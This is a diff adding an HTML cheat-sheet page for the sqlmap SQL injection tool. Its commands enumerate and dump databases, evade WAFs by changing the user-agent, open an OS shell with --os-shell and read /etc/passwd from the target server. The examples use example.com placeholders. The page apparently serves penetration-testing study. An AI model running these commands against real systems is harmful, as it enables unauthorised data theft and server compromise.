@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap: Comprehensive Guide</title>
+    <style>
+        body {
+            font-family: 'Lucida Console', Monaco, monospace;
+            margin: 20px;
+            background-color: #1c1c1c;
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+        h1 {
+            text-align: center;
+            color: #00ff00;
+            text-shadow: 1px 1px 3px #000;
+            font-size: 2.5em;
+        }
+        h2 {
+            color: #00ff00;
+            text-shadow: 1px 1px 3px #000;
+        }
+        .button {
+            background: rgba(40, 40, 40, 0.8);
+            padding: 10px;
+            border-radius: 5px;
+            transition: background 0.3s, transform 0.3s;
+            text-align: center;
+        }
+        .button:hover {
+            background: rgba(50, 150, 50, 0.7);
+        }
+        a {
+            text-decoration: none;
+            color: #e0e0e0;
+            display: block;
+            transition: transform 0.3s;
+        }
+        a:focus {
+            transform: scale(1.1); /* Slightly enlarge the focused link */
+        }
+        a:hover {
+            color: #000;
+            background-color: #00ff00;
+            padding: 2px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="button"><a href="index.html">GO BACK TO HOME</a></div>
+    <h1>SQLMap: Comprehensive Guide</h1>
+
+    <h2>1. Basic Usage</h2>
+    <p>
+        <strong>Target a URL with a Vulnerable Parameter:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;?param=value"</code>
+    </p>
+    <p>
+        <strong>Get Database List:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --dbs</code>
+    </p>
+
+    <h2>2. Testing with POST Data</h2>
+    <p>
+        <strong>Send a POST Request:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --data="param1=value1&param2=value2"</code>
+    </p>
+    <p>
+        <strong>Specify Risk and Level:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --data="param1=value1" --risk=3 --level=5</code>
+    </p>
+
+    <h2>3. Identifying the Database Type</h2>
+    <p>
+        <strong>Check the Database Type:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --dbs --technique=E</code>
+    </p>
+
+    <h2>4. Retrieving Database Tables</h2>
+    <p>
+        <strong>Specify the Database:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" -D &lt;database-name&gt; --tables</code>
+    </p>
+
+    <h2>5. Extracting Data from Tables</h2>
+    <p>
+        <strong>Dump All Data from a Table:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" -D &lt;database-name&gt; -T &lt;table-name&gt; --dump</code>
+    </p>
+
+    <h2>6. Extracting Specific Columns</h2>
+    <p>
+        <strong>Specify Columns to Dump:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" -D &lt;database-name&gt; -T &lt;table-name&gt; --columns</code><br>
+        <code>sqlmap -u "&lt;target-url&gt;" -D &lt;database-name&gt; -T &lt;table-name&gt; --dump --columns="&lt;column1&gt;,&lt;column2&gt;"</code>
+    </p>
+
+    <h2>7. Bypassing WAFs and Security Mechanisms</h2>
+    <p>
+        <strong>Use Randomized User-Agent:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</code>
+    </p>
+    <p>
+        <strong>Use Proxy for Requests:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --proxy="http://127.0.0.1:8080"</code>
+    </p>
+
+    <h2>8. Using SQLMap with Cookies</h2>
+    <p>
+        <strong>Pass Cookies for Authenticated Requests:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --cookie="PHPSESSID=&lt;session-id&gt;"</code>
+    </p>
+
+    <h2>9. Handling Time-Based SQL Injection</h2>
+    <p>
+        <strong>Use Time-Based Techniques:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --time-sec=5 --technique=T</code>
+    </p>
+
+    <h2>10. Injecting Shell Commands</h2>
+    <p>
+        <strong>Execute OS Commands:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --os-shell</code>
+    </p>
+
+    <h2>11. Dumping Files from the Server</h2>
+    <p>
+        <strong>Dump a File:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --file-read="/etc/passwd"</code>
+    </p>
+
+    <h2>12. Saving Output to a File</h2>
+    <p>
+        <strong>Save Results:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --dbs --output-dir=./output</code>
+    </p>
+
+    <h2>13. Verbose Mode</h2>
+    <p>
+        <strong>Enable Verbose Output for Debugging:</strong><br>
+        <code>sqlmap -u "&lt;target-url&gt;" --verbose=3</code>
+    </p>
+
+    <h2>14. Documentation and Community</h2>
+    <p>
+        Refer to the SQLMap documentation for detailed usage, options, and examples.
+        Engage in forums or communities for tips and updated techniques.
+    </p>
+
+    <h2>Example Scenarios</h2>
+    <p>
+        <strong>1. Basic Database Enumeration:</strong><br>
+        <code>sqlmap -u "http://example.com/page.php?id=1" --dbs</code><br>
+        This command retrieves a list of databases available on the target server.
+    </p>
+    <p>
+        <strong>2. Extracting Tables from a Specific Database:</strong><br>
+        <code>sqlmap -u "http://example.com/page.php?id=1" -D testdb --tables</code><br>
+        This command lists all tables in the specified database testdb.
+    </p>
+    <p>
+        <strong>3. Dumping Data from a Specific Table:</strong><br>
+        <code>sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --dump</code><br>
+        This command extracts all data from the users table in the testdb database.
+    </p>
+    <p>
+        <strong>4. Using POST Data for Injection:</strong><br>
+        <code>sqlmap -u "http://example.com/login.php" --data="username=admin&password=12345"</code><br>
+        This command tests the login endpoint for SQL injection vulnerabilities using POST parameters.
+    </p>
+    <p>
+        <strong>5. Extracting Specific Columns from a Table:</strong><br>
+        <code>sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --dump --columns="username,email"</code><br>
+        This command retrieves only the username and email columns from the users table.
+    </p>
+    <p>
+        <strong>6. Using Cookies for Authentication:</strong><br>
+        <code>sqlmap -u "http://example.com/dashboard.php" --cookie="PHPSESSID=abcd1234"</code><br>
+        This command uses a session cookie to authenticate and test for SQL injection.
+    </p>
+    <p>
+        <strong>7. Bypassing a Web Application Firewall (WAF):</strong><br>
+        <code>sqlmap -u "http://example.com/page.php?id=1" --user-agent="Mozilla/5.0"</code><br>
+        This command sends a request with a custom User-Agent header to evade detection.
+    </p>
+    <p>
+        <strong>8. Reading a File from the Server:</strong><br>
+        <code>sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"</code><br>
+        This command attempts to read the /etc/passwd file from the target server.
+    </p>
+    <p>
+        <strong>9. Time-Based Blind SQL Injection:</strong><br>
+        <code>sqlmap -u "http://example.com/page.php?id=1" --time-sec=5 --technique=T</code><br>
+        This command tests for time-based SQL injection vulnerabilities, waiting 5 seconds for each response.
+    </p>
+    <p>
+        <strong>10. Using Proxies:</strong><br>
+        <code>sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"</code><br>
+        This command routes SQLMap traffic through a specified proxy server.
+    </p>
+
+    <div class="container">
+        <div class="button"><a href="index.html">GO BACK TO HOME</a></div>
+</body>
+</html>
